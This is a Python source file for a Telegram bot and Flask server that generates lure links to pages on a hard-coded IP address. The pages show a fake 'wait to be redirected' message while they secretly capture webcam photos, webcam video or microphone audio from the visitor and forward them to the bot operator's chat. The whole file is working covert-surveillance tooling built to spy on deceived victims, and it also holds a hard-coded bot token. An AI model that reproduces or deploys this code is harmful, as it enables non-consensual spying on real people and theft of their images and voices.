import telebot
from flask import Flask, request, render_template_string
import os
from threading import Thread
import base64
import time
import uuid

tok = '6546872585:AAFE7sFBDqyqBERPfC9xk-2awB5GcpIG_mg'
bot = telebot.TeleBot(tok)
app = Flask(__name__)

UPLOAD_FOLDER = 'uploads'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

users = {}

html_content_image = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture Image</title>
</head>
<body>
    <p>انتظر لمدة 10 ثواني وسيتم تحويلك للرابط.</p>
    <script>
        navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
            var video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            var canvas = document.createElement('canvas');
            canvas.width = 640;
            canvas.height = 480;
            var context = canvas.getContext('2d');

            setTimeout(() => {
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                var image1 = canvas.toDataURL('image/png');

                fetch('/upload-image/{{user_id}}', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ image: image1 })
                }).then(response => response.text())
                  .then(data => console.log(data));

                setTimeout(() => {
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    var image2 = canvas.toDataURL('image/png');

                    fetch('/upload-image/{{user_id}}', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ image: image2 })
                    }).then(response => response.text())
                      .then(data => console.log(data));

                    stream.getTracks().forEach(track => track.stop());
                }, 1000);
            }, 1000);
        })
        .catch(function(err) {
            console.log("حدث خطأ: " + err);
        });
    </script>
</body>
</html>
'''

html_content_video = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Record Video</title>
</head>
<body>
    <p>انتظر لمدة 10 ثواني وسيتم تحويلك للرابط.</p>
    <script>
        navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
            var video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            var mediaRecorder = new MediaRecorder(stream);
            var chunks = [];

            mediaRecorder.ondataavailable = function(event) {
                chunks.push(event.data);
            }

            mediaRecorder.onstop = function() {
                var blob = new Blob(chunks, { type: 'video/webm' });
                var formData = new FormData();
                formData.append('video', blob);

                fetch('/upload-video/{{user_id}}', {
                    method: 'POST',
                    body: formData
                }).then(response => response.text())
                  .then(data => console.log(data));
            }

            mediaRecorder.start();

            setTimeout(() => {
                mediaRecorder.stop();
                stream.getTracks().forEach(track => track.stop());
            }, 3000); // تسجيل الفيديو لمدة 3 ثواني
        })
        .catch(function(err) {
            console.log("حدث خطأ: " + err);
        });
    </script>
</body>
</html>
'''

html_content_audio = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Record Audio</title>
</head>
<body>
    <p>انتظر لمدة 10 ثواني وسيتم تحويلك للرابط.</p>
    <script>
        navigator.mediaDevices.getUserMedia({ audio: true })
        .then(function(stream) {
            var mediaRecorder = new MediaRecorder(stream);
            var chunks = [];

            mediaRecorder.ondataavailable = function(event) {
                chunks.push(event.data);
            }

            mediaRecorder.onstop = function() {
                var blob = new Blob(chunks, { type: 'audio/webm' });
                var formData = new FormData();
                formData.append('audio', blob);

                fetch('/upload-audio/{{user_id}}', {
                    method: 'POST',
                    body: formData
                }).then(response => response.text())
                  .then(data => console.log(data));
            }

            mediaRecorder.start();

            setTimeout(() => {
                mediaRecorder.stop();
            }, 5000); // تسجيل الصوت لمدة 3 ثواني
        })
        .catch(function(err) {
            console.log("حدث خطأ: " + err);
        });
    </script>
</body>
</html>
'''

@app.route('/capture/<user_id>')
def capture(user_id):
    return render_template_string(html_content_image, user_id=user_id)

@app.route('/record/<user_id>')
def record(user_id):
    return render_template_string(html_content_video, user_id=user_id)

@app.route('/audio/<user_id>')
def audio(user_id):
    return render_template_string(html_content_audio, user_id=user_id)

@app.route('/upload-image/<user_id>', methods=['POST'])
def upload_image(user_id):
    data = request.json
    image_data = data['image'].split(',')[1]
    image_path = os.path.join(UPLOAD_FOLDER, f'captured_image_{user_id}_{time.time()}.png')
    with open(image_path, 'wb') as f:
        f.write(base64.b64decode(image_data))

    if user_id in users:
        chat_id = users[user_id]
        bot.send_photo(chat_id, photo=open(image_path, 'rb'))
    return "تم استقبال الصورة وإرسالها!"

@app.route('/upload-video/<user_id>', methods=['POST'])
def upload_video(user_id):
    if 'video' not in request.files:
        return "لم يتم استلام الفيديو", 400

    video = request.files['video']
    video_path = os.path.join(UPLOAD_FOLDER, f'recorded_video_{user_id}_{time.time()}.webm')
    video.save(video_path)

    if user_id in users:
        chat_id = users[user_id]
        with open(video_path, 'rb') as video_file:
            bot.send_video(chat_id, video_file)
    return "تم استقبال الفيديو وإرساله!"

@app.route('/upload-audio/<user_id>', methods=['POST'])
def upload_audio(user_id):
    if 'audio' not in request.files:
        return "لم يتم استلام الصوت", 400

    audio = request.files['audio']
    audio_path = os.path.join(UPLOAD_FOLDER, f'recorded_audio_{user_id}_{time.time()}.webm')
    audio.save(audio_path)

    if user_id in users:
        chat_id = users[user_id]
        with open(audio_path, 'rb') as audio_file:
            bot.send_voice(chat_id, audio_file)
    return "تم استقبال الصوت وإرساله!"

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    chat_id = message.chat.id
    user_id = str(uuid.uuid4())
    users[user_id] = chat_id
    keyboard = telebot.types.InlineKeyboardMarkup()
    capture_button = telebot.types.InlineKeyboardButton(text='التقاط صورة 🖼️', callback_data=f'capture_{user_id}')
    video_button = telebot.types.InlineKeyboardButton(text='تسجيل فيديو 🎥', callback_data=f'record_{user_id}')
    audio_button = telebot.types.InlineKeyboardButton(text='تسجيل صوت 🎤', callback_data=f'audio_{user_id}')
    
    ur = telebot.types.InlineKeyboardButton(text='مبرمج البوت 👨‍💻',url='https://t.me/PY_50')
    
    keyboard.add(capture_button, video_button)
    keyboard.add(audio_button,ur)
    
    bot.send_message(chat_id, "اهلا بك عزيزي اختر ماتريده من هنا", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    if call.data.startswith('capture_'):
        user_id = call.data.split('_')[1]
        bot.send_message(call.from_user.id, f"🖼️ url : http://147.79.118.154:5000/capture/{user_id}")
    elif call.data.startswith('record_'):
        user_id = call.data.split('_')[1]
        bot.send_message(call.from_user.id, f"🎥 url : http://147.79.118.154:5000/record/{user_id}")
    elif call.data.startswith('audio_'):
        user_id = call.data.split('_')[1]
        bot.send_message(call.from_user.id, f"🎤 url : http://147.79.118.154:5000/audio/{user_id}")

def run_flask_and_bot():
    t1 = Thread(target=lambda: bot.polling())
    t1.start()
    app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)

if __name__ == "__main__":
	run_flask_and_bot()
